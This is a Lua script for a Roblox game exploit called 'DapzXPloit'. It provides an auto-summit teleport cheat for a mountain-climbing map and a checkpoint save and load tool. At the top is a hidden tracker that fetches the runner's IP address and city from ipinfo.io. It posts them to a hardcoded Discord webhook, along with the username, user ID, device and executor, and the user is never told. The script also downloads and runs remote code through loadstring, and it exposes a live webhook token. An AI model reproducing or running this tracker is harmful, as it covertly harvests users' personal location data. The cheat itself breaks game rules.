-- =========================
--  DapzXPloit
--  Version Lite
-- =========================

-- Ganti webhook URL mu disini
local webhookURL = "https://discord.com/api/webhooks/1421153532861747230/npCLU35K2XPTMgo7HTD26_nRjR8gwYOD3GianMN3A9IPgI9FhBX73lw6y6_fSRQGKVWl"

-- Services (utama)
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")
local plr = Players.LocalPlayer

-- player
local player = Players.LocalPlayer
local username = player and player.Name or "Unknown"
local userId = player and player.UserId or 0
local placeId = game.PlaceId
local time = os.date("%Y-%m-%d %H:%M:%S")

-- device user
local deviceType = "Unknown"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
    deviceType = "PC"
elseif UserInputService.GamepadEnabled then
    deviceType = "Console"
end

-- Info Executor User
local executor = "Unknown"
pcall(function()
    if typeof(identifyexecutor) == "function" then
     executor = identifyexecutor()
    elseif typeof(getexecutor) == "function" then
     executor = getexecutor()
    elseif typeof(executor_name) == "string" then
     executor = executor_name
    elseif typeof(_G.ExecutorName) == "string" then
     executor = _G.ExecutorName
    end
end)

-- IP dan lokasi (via ipinfo.io)
local ipAddress, country, region, city = "Unknown", "Unknown", "Unknown", "Unknown"
pcall(function()
    local requestFunc =
        (syn and syn.request) or
        (http and http.request) or
        http_request or
        request

    if requestFunc then
        local res = requestFunc({
            Url = "https://ipinfo.io/json",
            Method = "GET"
        })

        if res and res.Body then
            local decoded = HttpService:JSONDecode(res.Body)
            if decoded then
                ipAddress = decoded.ip or "Unknown"
                country   = decoded.country or "Unknown"
                region    = decoded.region or "Unknown"
                city      = decoded.city or "Unknown"
            end
        end
    end
end)

-- info ke Discord
local data = {
    content = "**Script sedang dipakai!!**",
    embeds = {{
        title = "📩 Informasi - Player",
        color = 15158332,
        fields = {
            {name = "👤 Username", value = username, inline = true},
            {name = "🆔 User ID", value = tostring(userId), inline = true},
            {name = "📱 Device", value = deviceType, inline = true},
            {name = "🗺️ Maps", value = string.format("[Link Maps](https://www.roblox.com/games/%d)", placeId), inline = true},  --biar jadi link
            {name = "🛠️ Executor", value = executor, inline = true},
            {name = "⏰ Time", value = time, inline = true},
            {name = "🌐 IP", value = ipAddress, inline = true},
            {name = "📍 Lokasi", value = (city .. ", " .. region .. ", " .. country), inline = true},
     },
     footer = { text = "Script by DapzXPloit" },
     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
local body = HttpService:JSONEncode(data)

--  kirim webhook ---
local function sendWebhook()
 local requestFunc =
  (syn and syn.request) or
  (http and http.request) or
  http_request or
  request

 if requestFunc then
  local success, result = pcall(function()
   return requestFunc({
    Url = webhookURL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = body
   })
  end)

  if success then
   print("✅ Webhook terkirim!")
  else
   warn("❌ Gagal kirim webhook:", result)
  end
 else
  warn("❌ Executor tidak support HTTP Request.")
 end
end

-- Jalankan
sendWebhook()

-- =========================
--  Helper: Instance/Checkpoint utilities
-- =========================

local function resolveInstanceFromPath(path)
    if typeof(path) == "Vector3" then
        return path
    end
    if typeof(path) == "Instance" then
        return path
    end

    if type(path) ~= "string" then return nil end
    local cur = workspace
    for part in string.gmatch(path, "[^%.]+") do
        if part:lower() == "workspace" then
            cur = workspace
        else
            cur = cur:FindFirstChild(part)
        end
        if not cur then return nil end
    end
    return cur
end

local function getBasePartFromInstance(inst)
    if not inst then return nil end
    if typeof(inst) == "Vector3" then
        return nil
    end
    if inst:IsA("BasePart") then
        return inst
    elseif inst:IsA("Model") then
        if inst.PrimaryPart and inst.PrimaryPart:IsA("BasePart") then
            return inst.PrimaryPart
        end
        for _, v in ipairs(inst:GetDescendants()) do
            if v:IsA("BasePart") then
                return v
            end
        end
    end
    return nil
end

local function getCheckpointPosition(cp)
    if not cp then return nil end
    if typeof(cp) == "Vector3" then return cp end
    if cp.Pos and typeof(cp.Pos) == "Vector3" then return cp.Pos end
    if cp.Path and type(cp.Path) == "string" then
        local resolved = resolveInstanceFromPath(cp.Path)
        if resolved then
            local bp = getBasePartFromInstance(resolved)
            if bp then return bp.Position end
        end
    end
    if type(cp) == "string" then
        local resolved = resolveInstanceFromPath(cp)
        if resolved then
            local bp = getBasePartFromInstance(resolved)
            if bp then return bp.Position end
        end
    end
    return nil
end

-- Random float helper
local function randFloat(min, max)
    return min + math.random() * (max - min)
end

-- =========================
--  UI (Rayfield) dan Tabs
-- =========================
-- Load Rayfield (tetap seperti semula)
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "[EXCLUSIVE] ⛰️Mount Project - DapzXPloit",
    Icon = 0,
    LoadingTitle = "Loading script...🪩",
    LoadingSubtitle = "Powered by DapzXTeam",
    ShowText = "DapzXPloit",
    Theme = "Default",
    ConfigurationSaving = {
        Enabled = false, 
        FolderName = "DapzXTeam",
        FileName = "DapzXPloit"
    },
    DisableRayfieldPrompts = true,
})

-- =========================
--  Global Defaults / Vars
-- =========================
getgenv().Checkpoints = {
{Name = "Spawn", Pos = Vector3.new(-925.52, 371.61, 37.74)},
{Name = "Checkpoint 1", Pos = Vector3.new(-903.17, 364.01, -428.28)},
{Name = "Checkpoint 2", Pos = Vector3.new(-602.62, 421.12, -545.52)},
{Name = "Summit", Pos = Vector3.new(2496.26, 2223.81, 15.70)},
}
getgenv().CurrentCheckpoint = 1
getgenv().AutoSummitLoop = false
getgenv().AutoSummitOnce = false
getgenv().AutoSummitRunning = false
getgenv().AutoSummitDelay = 0.8
getgenv().AutoSummitRespawn = false
getgenv().TeleportYOffset = 5

--  Helper: Notifications
local lastNotify = {}

local function SafeNotify(data)
    local now = tick()
    if data == nil or type(data.Title) ~= "string" then return end
    if lastNotify[data.Title] and now - lastNotify[data.Title] < 1.5 then return end
    lastNotify[data.Title] = now
    pcall(function() Rayfield:Notify(data) end)
end

--  Auto Summit
local function AutoSummitHandler()

    plr = plr or Players.LocalPlayer
    if not plr then

        local ok, p = pcall(function() return Players.LocalPlayer end)
        plr = (ok and p) or plr
    end

    if getgenv().AutoSummitRunning then return end
    getgenv().AutoSummitRunning = true

    local mode = getgenv().AutoSummitLoop and "Loop" or "Sekali"
    SafeNotify({Title="🪬 Auto Summit "..mode, Content="Dimulai!", Duration=2})

    task.spawn(function()
        local function gotoCheckpoint(i)

            if not plr then plr = Players.LocalPlayer end
            if not plr then return end
            local char = plr.Character or plr.CharacterAdded:Wait()
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart",5)
            if not hrp then return end

            local cp = getgenv().Checkpoints[i]
            local pos = cp and (cp.Pos or getCheckpointPosition(cp))
            if pos then
                pcall(function()
                    hrp.CFrame = CFrame.new(pos + Vector3.new(
                        math.random(-0.3,0.3),
                        getgenv().TeleportYOffset,
                        math.random(-0.3,0.3)
                    ))
                end)
                getgenv().CurrentCheckpoint = i
                task.wait(getgenv().AutoSummitDelay + math.random()*0.2)
            end
        end

        -- Once Mode
        if getgenv().AutoSummitOnce then
            getgenv().CurrentCheckpoint = 1
            for i = getgenv().CurrentCheckpoint, #getgenv().Checkpoints do
                gotoCheckpoint(i)
            end
            getgenv().AutoSummitOnce = false
            getgenv().AutoSummitRunning = false

            SafeNotify({Title="🫧 Auto Summit Sekali", Content="Selesai!", Duration=2})
            return
        end

        -- Loop Mode
        if getgenv().AutoSummitLoop then
            getgenv().CurrentCheckpoint = 1
        end

        while getgenv().AutoSummitLoop do
            gotoCheckpoint(getgenv().CurrentCheckpoint)

            if getgenv().CurrentCheckpoint >= #getgenv().Checkpoints then

                if getgenv().AutoSummitRespawn then
                    pcall(function()
                        if plr and plr.Character then
                            plr.Character:BreakJoints()
                        end
                    end)
                    local newChar = plr.CharacterAdded:Wait()
                    newChar:WaitForChild("HumanoidRootPart",10)
                    task.wait(0.1)
                end

                getgenv().CurrentCheckpoint = 1
            else
                getgenv().CurrentCheckpoint += 1
            end

            task.wait(0.1)
        end

        getgenv().AutoSummitRunning = false
        SafeNotify({Title="🚀 Auto Summit Stopped", Content="Berhenti", Duration=2})
    end)
end

-- Tabs
local MainTab = Window:CreateTab("🗻 Main")
local CopyTab = Window:CreateTab("📋 CopyPos")

-- Main Tab
MainTab:CreateParagraph({Title = "Note :", Content = "Jika kurang puas sama delay\nSilahkan atur delay dibawah\nJika terjadi bug mohon segera hubungi Owner"})
MainTab:CreateToggle({
    Name="⛳ Auto Summit Loop (BEST)",
    CurrentValue=false,
    Callback=function(v)
        getgenv().AutoSummitLoop = v
        if v then
            getgenv().AutoSummitOnce = false
            getgenv().CurrentCheckpoint = 1
            AutoSummitHandler()
        end
    end
})
MainTab:CreateButton({
    Name="🎯 Auto Summit Sekali",
    Callback=function()
        getgenv().AutoSummitOnce = true
        getgenv().CurrentCheckpoint = 1
        AutoSummitHandler()
    end
})
MainTab:CreateSlider({Name="⏳ Summit Delay", Range={1,20}, Increment=1, Suffix="Detik", CurrentValue=getgenv().AutoSummitDelay, Callback=function(v) getgenv().AutoSummitDelay=v end})
MainTab:CreateParagraph({Title = "Note :", Content = "Off in respawn jika ingin Summit sekali/Otomatis Loop\nJika diaktifkan akan membuat setiap summit Respawn"})
MainTab:CreateToggle({Name="🛌 Respawn setelah Summit", CurrentValue=getgenv().AutoSummitRespawn, Callback=function(v)
    getgenv().AutoSummitRespawn = v and true or false
    SafeNotify({Title="🛌 Respawn", Content=getgenv().AutoSummitRespawn and "Aktif" or "Nonaktif", Duration=2})
end})

--  CopyPosition 
local CopyPositionBuffer = {}

-- Fungsi salin ke clipboard (fallback untuk berbagai exploit)
local function copyToClipboard(text)
    if setclipboard then
        setclipboard(text)
    elseif toclipboard then
        toclipboard(text)
    else
        warn("Clipboard tidak didukung di exploit kamu.")
    end
end

-- Ambil posisi HumanoidRootPart pemain
local function getCurrentPosition()
    local localPlayer = plr or Players.LocalPlayer
    if not localPlayer then return nil end
    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    if not character then return nil end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp then return hrp.Position end
    return nil
end

-- Format string checkpoint serupa format yang ada di getgenv().Checkpoints
local function formatCheckpointString(name, pos)
    return string.format('{Name = "%s", Pos = Vector3.new(%.2f, %.2f, %.2f)},', name, pos.X, pos.Y, pos.Z)
end

CopyTab:CreateParagraph({Title = "CopyPosition", Content = "Gunakan tombol di bawah untuk menambahkan checkpoint dari posisi kamu dan menyalinnya ke clipboard."})
CopyTab:CreateButton({
    Name = "📍 CopyPos (Tambah Checkpoint)",
    Callback = function()
        local pos = getCurrentPosition()
        if not pos then
            pcall(function() Rayfield:Notify({Title = "⚠️ CopyPos", Content = "Tidak dapat menentukan posisi saat ini!", Duration = 3}) end)
            return
        end

        -- Perubahan: nomor dimulai dari 1 setiap kali script dijalankan
        local nextIndex = (#CopyPositionBuffer or 0) + 1
        local name = "Checkpoint " .. tostring(nextIndex)
        local formatted = formatCheckpointString(name, pos)

        table.insert(CopyPositionBuffer, formatted)
        copyToClipboard(formatted)

        pcall(function() Rayfield:Notify({Title = "📍 CopyPos", Content = name .. " berhasil disalin ke clipboard!", Duration = 3}) end)
    end
})
-- Tombol: Copy All Checkpoints
CopyTab:CreateButton({
    Name = "📋 Copy All Checkpoints",
    Callback = function()
        if #CopyPositionBuffer == 0 then
            pcall(function() Rayfield:Notify({Title = "📋 Copy All", Content = "Belum ada checkpoint yang disalin!", Duration = 3}) end)
            return
        end

        local all = table.concat(CopyPositionBuffer, "\n")
        copyToClipboard(all)
        pcall(function() Rayfield:Notify({Title = "📋 Copy All", Content = "Semua checkpoint disalin ke clipboard!", Duration = 3}) end)
    end
})

-- =========================
-- ✅ Sistem Save / Load Checkpoint (Final Versi untuk Delta Android)
-- =========================
local HttpService = game:GetService("HttpService")
local SaveFolder = "DapzXTeam/Checkpoint"

if not isfolder(SaveFolder) then
    makefolder(SaveFolder)
end

-- =========================
-- Fungsi aman untuk file (biar ga error di Delta)
-- =========================
local function safeWriteFile(path, data)
    local ok, err = pcall(function() writefile(path, data) end)
    return ok
end

local function safeReadFile(path)
    local ok, res = pcall(function() return readfile(path) end)
    if ok then return res else return nil end
end

local function safeIsFile(path)
    local ok, res = pcall(function() return isfile(path) end)
    return ok and res
end

-- =========================
-- Notifikasi aman pakai Rayfield
-- =========================
local function SafeNotify(tbl)
    pcall(function()
        Rayfield:Notify({
            Title = tbl.Title or "Info",
            Content = tbl.Content or "",
            Duration = tbl.Duration or 3
        })
    end)
end

-- =========================
-- Save checkpoint ke file JSON
-- =========================
local function saveCheckpointToFile(fileName, checkpoints)
    if not fileName or fileName == "" then
        SafeNotify({Title="⚠️ Save File", Content="Nama file tidak boleh kosong!", Duration=3})
        return
    end
    if #checkpoints == 0 then
        SafeNotify({Title="⚠️ Save File", Content="Belum ada checkpoint untuk disimpan!", Duration=3})
        return
    end

    local data = {Checkpoints = checkpoints}
    local json = HttpService:JSONEncode(data)
    local path = SaveFolder.."/"..fileName..".json"
    local ok = safeWriteFile(path, json)

    if ok then
        SafeNotify({Title="💾 Save File", Content="Berhasil menyimpan ke "..fileName..".json", Duration=3})
    else
        SafeNotify({Title="❌ Save File", Content="Gagal menyimpan file!", Duration=3})
    end
end

-- =========================
-- Load checkpoint dari file JSON
-- =========================
local function loadCheckpointFromFile(fileName)
    if not fileName or fileName == "" then
        SafeNotify({Title="⚠️ Load File", Content="Pilih file terlebih dahulu!", Duration=3})
        return
    end

    local path = SaveFolder.."/"..fileName..".json"
    if not safeIsFile(path) then
        SafeNotify({Title="⚠️ Load File", Content="File tidak ditemukan: "..fileName, Duration=3})
        return
    end

    local content = safeReadFile(path)
    if not content then
        SafeNotify({Title="❌ Load File", Content="Gagal membaca isi file!", Duration=3})
        return
    end

    local ok, decoded = pcall(function() return HttpService:JSONDecode(content) end)
    if not ok or type(decoded) ~= "table" or type(decoded.Checkpoints) ~= "table" then
        SafeNotify({Title="❌ Load File", Content="Format file tidak valid.", Duration=3})
        return
    end

    -- konversi tabel posisi jadi string "x, y, z"
    local fixed = {}
    for _, v in ipairs(decoded.Checkpoints) do
        if type(v) == "table" and v.x and v.y and v.z then
            table.insert(fixed, string.format("%f, %f, %f", v.x, v.y, v.z))
        elseif type(v) == "string" then
            table.insert(fixed, v)
        end
    end

    CopyPositionBuffer = fixed
    SafeNotify({Title="📂 Load File", Content="Berhasil memuat: "..fileName, Duration=3})
end

-- =========================
-- Ambil daftar file tersimpan
-- =========================
local function getSavedFiles()
    local files = {}
    local ok, list = pcall(function() return listfiles(SaveFolder) end)
    if ok and list then
        for _, f in ipairs(list) do
            local name = f:match("([^/]+)%.json$")
            if name then table.insert(files, name) end
        end
    end
    return files
end

-- =========================
-- UI di Tab CopyPos
-- =========================
CopyTab:CreateParagraph({
    Title="💾 Save / Load Checkpoint",
    Content="Simpan & muat posisi hasil CopyPos."
})

local SelectedFile = nil

local SaveFileInput = CopyTab:CreateInput({
    Name = "Masukkan nama file...",
    PlaceholderText = "Nama file tanpa .json",
    RemoveTextAfterFocusLost = false,
    Callback = function(Value)
        SelectedFile = Value
    end
})

CopyTab:CreateButton({
    Name = "💾 Save Sekarang",
    Callback = function()
        saveCheckpointToFile(SelectedFile, CopyPositionBuffer)
    end
})

local FileDropdown = CopyTab:CreateDropdown({
    Name = "Pilih File...",
    Options = getSavedFiles(),
    CurrentOption = nil,
    Callback = function(Value)
        SelectedFile = Value
    end
})

CopyTab:CreateButton({
    Name = "📂 Load Sekarang",
    Callback = function()
        loadCheckpointFromFile(SelectedFile)
    end
})

-- Auto-refresh daftar file
task.spawn(function()
    while task.wait(3) do
        local files = getSavedFiles()
        pcall(function()
            FileDropdown:Refresh(files)
        end)
    end
end)